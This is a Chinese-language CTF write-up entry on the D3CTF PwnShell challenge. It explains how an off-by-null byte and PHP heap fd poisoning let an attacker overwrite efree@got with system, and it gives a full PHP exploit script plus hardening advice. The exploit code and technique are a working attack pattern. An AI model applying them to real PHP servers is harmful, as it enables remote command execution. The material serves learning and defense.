---
id: ctf-pwn-php-extension-heap-offbynull-efree-got-system
title: PHP 扩展双堆块间接指针 + off-by-null：edit 任意地址写改 efree GOT 为 system 执行命令（D3CTF PwnShell）
type: scenario
domain: ctf
path: ctf/pwn
technique: php-extension-heap-offbynull-efree-got-system
aliases:
- D3CTF PwnShell
- PHP 扩展堆利用
- ck2 ck1 间接指针
- off-by-null 指针低字节
- efree GOT 改 system
- PHP 堆 tcache poison
tags:
- ctf
- pwn
- php
- php-extension
- heap
- off-by-null
- got-hijack
- tcache-poison
- arbitrary-write
- zendmm
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V297
  verified_at: '2026-11-08T08:39:45+08:00'
  notes: 已对照原文与全部12张图核对：add的ck2存ck1地址、edit经*ck2写、delete先free ck1再free ck2（图08-12调试佐证）；0x3f字符串off-by-null把ck8指针0x80改0x00落到ck5、remove(5)+edit(8)写efree@got fd、两次add覆写system(libc+0x4c490)、remove(0)触发/readflag，与原文exp一致。未验证点：未运行exp；GOT/系统偏移需按题目版本核对。
---

## 一句话结论

D3CTF PwnShell 的 PHP 扩展用“ck2 堆块保存 ck1 堆块地址”的两级结构实现 add/edit/delete：edit 通过 `*ck2` 定位后写入，因而一旦能改写 ck2 内容就得到任意地址写；利用 0x3f 字符串的结尾 `\x00` 制造 off-by-null，把 ck8 中指向 ck8 的指针低字节 `0x80` 改成 `0x00` 使其指向 ck5，再借 PHP 空闲堆块未校验的 `fd` 指针做类 tcache poison，两次 add 后把 `efree@got` 覆写为 `system`，最后 `removeHacker(0)` 触发 `system("/readflag > /var/www/html/flag.txt")`。

## 原理

- **两级堆块结构**：`addHacker($data1,$data2)` 分配两个堆块，ck1 存 `$data1`，ck2 存 ck1 的地址；`editHacker(index,$data)` 先用 ck2 里保存的指针找到 ck1，再往 ck1 写数据；`removeHacker(index)` 先 free ck1 再 free ck2。只要 ck2 的内容可被改写，`edit` 就会写到“我们指定的地址”，形成任意地址写原语。
- **PHP 堆特性**：原文指出 PHP 的内存分配先向系统一次性申请大块，再由自身内存管理池按桶分配，空闲块只有指向同尺寸下一个空闲块的 `fd`，且未对该指针做严格校验；效果类似 glibc 2.27 的 tcache，可把 `fd` 指向任意地址，让后续分配落到目标地址。该题中 0x40 大小的块即按此机制复用。
- **off-by-null**：PHP 字符串长度 0x3f 时实际分配 0x40 并带结尾 `\x00`。先 `removeHacker(7)` 释放原块，再 `addHacker(str_repeat('a',0x40), str_repeat('c',0x40))`；新块顶替 7 的位置，而 0x40 个 `c` 后面的 `\x00` 越过边界写进了相邻 ck8 的 ck2 中保存的 ck1 指针最低字节，把 `0x...80` 变成 `0x...00`——原本指向 ck8 的指针因此落到地址低一档的 ck5。
- **任意地址写**：`removeHacker(5)` 释放 ck5 后，`editHacker(8, int2str($mod_base+0x4038))` 由于 edit(8) 实际编辑的是 ck5，就把 `efree@got` 的地址写进了 ck5 空闲块的 `fd`。
- **GOT 覆写**：连续两次 `addHacker`：第一次分配把 ck5 取回；第二次分配按被篡改的 `fd` 返回 `efree@got`，并把 `$payload`（8 字节 `system` 地址重复 8 次，libc base+0x4c490）复制进该地址，从而把 `efree@got` 改成 `system`。
- **触发**：chunk 0 的数据区提前写入命令 `/readflag > /var/www/html/flag.txt\x00`；`removeHacker(0)` 调用 `efree(chunk0_data)`，GOT 已被换成 `system`，于是执行命令。
- **泄露**：与 mixture 相同，用 `ob_start()` + `include("/proc/self/maps")` 捕获 maps，正则分别提取 `libc.so.6` 和扩展 `vuln.so` 的映射起点，得到 `libc_base` 与 `mod_base`；`efree@got` 用扩展基址 + 0x4038，`system` 用 libc 基址 + 0x4c490（题目 libc/版本相关）。

## 触发条件

- PHP 扩展提供 add/edit/delete 类接口，且内部用“一个堆块保存另一个堆块地址”的间接结构，edit 对保存的指针不做校验。
- 存在 off-by-null（0x3f 长度字符串的结尾空字节越过 0x40 块边界）或类似的单字节越界写。
- PHP 空闲堆块的 `fd` 未校验（该题环境行为，原文按类 tcache 利用），且目标扩展的 GOT 可写（未开 Full RELRO/BIND_NOW）。
- 攻击者可执行 PHP 代码（CTF 提供上传/入口）；已知 libc 与扩展版本偏移（可由 `/proc/self/maps` 泄露基址后计算）。
- 需要能提前把命令字符串放进某个可被 free 的块（本例 chunk 0）。

## 利用步骤

1. 用 `ob_start()` + `include("/proc/self/maps")` 捕获输出，正则提取 `libc.so.6` 与 `vuln.so` 映射起点，算 `libc_base`、`mod_base`。
2. 准备 `$a = 'a'*0x40`、`$b = 'b'*0x3f`；循环 `addHacker($aaa,$b)` 布置 0x40 的 ck1 和保存指针的 ck2，直到索引 8 前后。
3. `editHacker(0, $cmd)` 把 `/readflag > /var/www/html/flag.txt\x00` 写入 chunk 0。
4. `removeHacker(7)` 释放块 7；`addHacker($a, 'c'*0x40)` 复用并利用结尾 `\x00` 把 ck8 的指针低字节改成 `0x00`（落到 ck5）。
5. `removeHacker(5)` 释放 ck5；`editHacker(8, int2str($mod_base+0x4038))` 把 `efree@got` 写入 ck5 的 `fd`。
6. `addHacker($a,$b)` 取回 ck5；`addHacker(str_repeat(int2str($libc_base+0x4c490),8), $b)` 使分配落到 `efree@got` 并写入 `system`。
7. `removeHacker(0)` 触发 `efree(cmd_ptr)` → `system(cmd)`，命令把 flag 写到 Web 目录后访问读取。

## PoC

原文 exp 核心：

```php
<?php
function int2str($i, $x = 8) {
    $re = "";
    for ($j = 0; $j < $x; $j++) { $re .= pack('C', $i & 0xff); $i >>= 8; }
    return $re;
}
function leakaddr($buffer){
    global $libc, $mbase;
    preg_match_all('/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/', $buffer, $libc);
    preg_match_all('/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln.so/', $buffer, $mbase);
    return "";
}
$libc=""; $mbase="";
ob_start("leakaddr");
include("/proc/self/maps");
$buffer = ob_get_contents(); ob_end_flush();
leakaddr($buffer);
$libc_base = hexdec($libc[1][0]);
$mod_base  = hexdec($mbase[1][0]);

$system_addr = 0x4c490;   // libc.so.6
$efree_got   = 0x4038;    // vuln.so

$a = str_repeat("a", 0x40);
$b = str_repeat("b", 0x3f);
for ($i = 1; $i < 0xe; $i++) {
    $aaa = str_repeat(pack("C", 0x61 + $i), 0x40);
    addHacker($aaa, $b);
}
$cmd = "/readflag > /var/www/html/flag.txt\x00";
editHacker(0, $cmd);

removeHacker(7);
$c = str_repeat("c", 0x40);
addHacker($a, $c);                       // 结尾 \x00 改 ck8 指针低字节 -> ck5

removeHacker(5);
editHacker(8, int2str($mod_base + $efree_got));  // ck5 fd = efree@got
addHacker($a, $b);
$payload = str_repeat(int2str($libc_base + $system_addr), 8);
addHacker($payload, $b);                 // 分配落到 efree@got，写入 system
removeHacker(0);                         // efree(cmd) -> system(cmd)
?>
```

要点：0x3f 长度产生 0x40 分配 + 结尾 `\x00`；ck8 指针低字节从 0x80 变 0x00 指向 ck5；`efree@got` 与 `system` 偏移必须按题目 libc/扩展版本核对。

## 变体与关联

- **同原语的变体**：任意能改写“保存他块指针”的堆块内容的漏洞（UAF、堆溢出、单字节越界）都可把 edit 变成任意地址写；目标是 GOT、函数指针表或 PHP 内部结构。
- **无 off-by-null 时**：若存在 UAF，可直接编辑空闲块 `fd` 做相同 poison；若存在堆溢出，可直接覆盖相邻空闲块的 `fd`。
- **与栈路径对比**：mixture 是扩展函数无界 `memcpy` 的栈溢出 + maps 泄露 + ROP；本题是堆结构/空闲链表操纵 + GOT 劫持，两者共用 `/proc/self/maps` 泄露思路。
- **版本差异**：PHP 扩展 API 路径 `no-debug-non-zts-20230831` 对应 PHP 8.3 的模块目录；不同 PHP 版本堆管理细节和 GOT 偏移不同，利用前需确认。

## 检测与防御

- 扩展代码审查：add/edit/delete 不应把“数据块指针”存放在可由用户写的数据块里；edit 前校验目标指针属于已分配块，remove 后将指针置空，避免 UAF/任意写。
- 边界检查：按分配大小截断用户输入，确保结尾空字节不越界（0x3f 字符串分配 0x40 时尤其注意）；使用记录实际长度的安全字符串 API。
- 编译加固：扩展开启 Full RELRO/BIND_NOW 使 GOT 只读，开启 stack protector 与 FORTIFY；PHP 进程启用地址随机化与只读重定位。
- 运行面：不在生产加载不可信扩展；限制 PHP 文件执行与 `/proc` 读取；监控异常 `include("/proc/self/maps")` 与扩展函数高频调用。
